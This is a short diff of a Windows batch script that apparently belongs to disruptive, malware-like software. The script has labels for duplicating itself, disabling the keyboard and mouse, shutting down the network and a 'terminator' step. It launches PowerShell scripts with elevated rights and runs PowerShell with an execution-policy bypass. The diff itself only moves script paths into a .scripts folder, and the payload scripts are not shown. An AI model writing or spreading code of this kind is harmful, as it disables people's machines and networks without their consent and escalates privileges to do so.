@@ -34,13 +34,13 @@ for /f "tokens=2 delims=," %%b in ('wmic path Win32_Keyboard get Description^,De
 
 
 :duplication
-PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', 'make_file.ps1' -Verb RunAs"
+PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', '.scripts\make_file.ps1' -Verb RunAs"
 
 
 goto disablekeyboardandmouse
 PowerShell.exe -ExecutionPolicy Bypass
-PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', 'ShutNet.ps1' -Verb RunAs"
+PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', '.scripts\ShutNet.ps1' -Verb RunAs"
 goto duplication
-cscript main.vbs
+cscript .scripts\main.vbs
 goto netsecurety
 goto terminator
